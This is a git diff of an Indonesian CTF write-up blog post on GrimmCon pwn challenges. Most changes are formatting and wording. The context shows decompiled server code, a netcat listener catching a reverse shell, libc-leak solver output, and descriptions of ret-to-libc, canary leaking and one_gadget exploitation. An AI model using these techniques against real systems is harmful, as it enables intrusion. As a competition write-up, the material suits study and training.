@@ -7,6 +7,8 @@ categories:
   - PWN
 ---
 
+Tulisan ini akan menjadi sebuah *remainder* perjalanan saya *mungkin* selama setengah tahun lebih saya mulai masuk ke-dunia CTF, hingga men-*juara*-i event - event CTF di tingkat Pelajar. Mengingat tahun depan sudah mulai masuk universitas, *nugad*, *nugad*, dan *nugad*. ~
+
 ![Banner Intro](https://raw.githubusercontent.com/abdullahnz/abdullahnz.github.io/master/_posts/images/grimmcon/intro.png)
 
 ## Stacked [489 pts]
@@ -34,22 +36,22 @@ int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
 
     if ( argc <= 1 )
     {
-    fwrite("Not enough arguments.\n", 1uLL, 0x16uLL, _bss_start);
-    fwrite("Usage: ./stacked [port]\n", 1uLL, 0x18uLL, _bss_start);
-    exit(1);
+        fwrite("Not enough arguments.\n", 1uLL, 0x16uLL, _bss_start);
+        fwrite("Usage: ./stacked [port]\n", 1uLL, 0x18uLL, _bss_start);
+        exit(1);
     }
     v13 = atoi(argv[1]);
     fd = socket(2, 1, 0);
     if ( fd == -1 )
     {
-    fwrite("Failed to create socket.\n", 1uLL, 0x19uLL, _bss_start);
-    exit(1);
+        fwrite("Failed to create socket.\n", 1uLL, 0x19uLL, _bss_start);
+        exit(1);
     }
     optval = 1;
     if ( setsockopt(fd, 1, 2, &optval, 4u) < 0 )
     {
-    fwrite("Error setting socket options.\n", 1uLL, 0x1EuLL, _bss_start);
-    exit(1);
+        fwrite("Error setting socket options.\n", 1uLL, 0x1EuLL, _bss_start);
+        exit(1);
     }
     bzero(&s, 0x10uLL);
     s = 2;
@@ -57,25 +59,25 @@ int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
     v7 = htons(v13);
     if ( bind(fd, (const struct sockaddr *)&s, 0x10u) )
     {
-    fwrite("Failed to bind socked.\n", 1uLL, 0x17uLL, _bss_start);
-    exit(1);
+        fwrite("Failed to bind socked.\n", 1uLL, 0x17uLL, _bss_start);
+        exit(1);
     }
     if ( listen(fd, 5) )
     {
-    fwrite("Failed to listen.\n", 1uLL, 0x12uLL, _bss_start);
-    exit(1);
+        fwrite("Failed to listen.\n", 1uLL, 0x12uLL, _bss_start);
+        exit(1);
     }
     fprintf(_bss_start, "Listening on port %d...\n", (unsigned int)v13, argv);
     addr_len = 16;
     while ( 1 )
     {
-    v11 = accept(fd, &addr, &addr_len);
-    v3 = inet_ntoa(*(struct in_addr *)&addr.sa_data[2]);
-    fprintf(_bss_start, "Received connection from: %s\n", v3);
-    v10 = fork();
-    if ( !v10 )
-        break;
-    close(v11);
+        v11 = accept(fd, &addr, &addr_len);
+        v3 = inet_ntoa(*(struct in_addr *)&addr.sa_data[2]);
+        fprintf(_bss_start, "Received connection from: %s\n", v3);
+        v10 = fork();
+        if ( !v10 )
+            break;
+        close(v11);
     }
     handle_client(v11);
     close(v11);
@@ -83,7 +85,7 @@ int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
 }
 ```
 
-Fungsi main hanya melalukan listening ke localhost dengan port merupakan argument kedua dari user. Lalu, untuk interaksi diproses pada fungsi handle_client.
+Fungsi main hanya melalukan listening ke localhost dengan port merupakan argument kedua. Lalu, untuk interaksi diproses pada fungsi handle_client.
 
 ```c
 ssize_t __fastcall handle_client(int a1)
@@ -153,7 +155,7 @@ if __name__ == '__main__':
 
 profit.
 
-```
+```py
 $ nc -vlp 4444
 Listening on [0.0.0.0] (family 0, port 4444)
 Connection from localhost 57362 received!
@@ -174,11 +176,11 @@ flag{e4fd4c9fcad9ba84666e5c7a4a9ab1f0}
 
 ## Patches Revenge [500pts]
 
-Libc diberikan, berarti perlu *leak-meleak* disini.
+Libc diberikan, berarti perlu *leak-meleak* disini. dan *mungkin* ret-to-libc (?)
 
 ### Main Function
 
-Hanya singkat, write dan read.
+Sangat singkat, write dan read. Dan ada bof di read.
 
 ```c
 int __cdecl main(int argc, const char **argv, const char **envp)
@@ -262,7 +264,7 @@ if __name__ == '__main__':
 
 ret-to-libc for profil.
 
-```
+```py
 $ python solver.py 31322
 [*] '/home/abdullahnz/ctf/grimmcon/pwn/patches/patches'
     Arch:     amd64-64-little
@@ -335,12 +337,12 @@ Oke, karena input pakai read. Read itu tidak mengakhiri buffer dengan *nullbyte*
 Karena *puts* itu terminate dengan *nullbyte*.
 
 ```python
-$ python -c 'print "a"*0x28' | ./weird_cookie
+$ python -c 'print "a"*0x27' | ./weird_cookie
 
 00000000  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
 00000010  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
-00000020  61 61 61 61 61 61 61 61  0a b1 18 6d 87 29 34 12  |aaaaaaaa...m.)4.|
-00000030  90 52 55 55 55 55                                  |.RUUUU|
+00000020  61 61 61 61 61 61 61 0a  d2 b1 18 6d 87 29 34 12  |aaaaaaaa...m.)4.|
+00000030  90 52 55 55 55 55        ^^                       |.RUUUU|
 [snip]
 ```
 
@@ -348,7 +350,7 @@ Seperti yang saya katakan diatas. Libc leak dapat didapatkan dengan xor saved_ca
 
 Karena overflow hanya 24 byte, dan 16 byte untuk canary dan padding. Jadi untuk rop sendiri itu hanya 8 byte. Jadi, ret-to-libc dengan system disini tidak bisa dilakukan. Karena harus set parameter dulu yang butuh minimal 24 bytes.
 
-Nah, karena versi libc yang dipakai server itu 2.27. Spray one_gadget disini bisa dilakukan. Fyi, semenjak saya masuk di libc.2.31, one_gadget hook tidak bisa dilakukan :'(.
+Nah, karena versi libc yang dipakai server itu 2.27. Spray one_gadget disini bisa dilakukan. FYI, semenjak saya masuk di libc.2.31, one_gadget hook tidak bisa dilakukan :'(.
 
 Full solver,
 
@@ -396,7 +398,7 @@ if __name__ == '__main__':
 
 Run and got the flag~.
 
-```
+```py
 $ python solver.py 30824
 [+] Opening connection to challenge.ctf.games on port 30824: Done
 [*] leak 0x7fec3b993f70
@@ -430,7 +432,7 @@ I set up a secure environment for users to execute shellcode. Now nobody will be
 
 Blacklist syscall numbers.
 
-```
+```py
     line  CODE  JT   JF      K
     =================================
     0000: 0x20 0x00 0x00 0x00000004  A = arch
@@ -802,7 +804,7 @@ if __name__ == '__main__':
 
 This chall, only 1 team solve this lol. Yeah its me lol.
 
-```
+```py
 [+] Opening connection to challenge.ctf.games on port 31213: Done
 [*] leak 0x7f6fb0456ca0
 [*] libc 0x7f6fb006b000
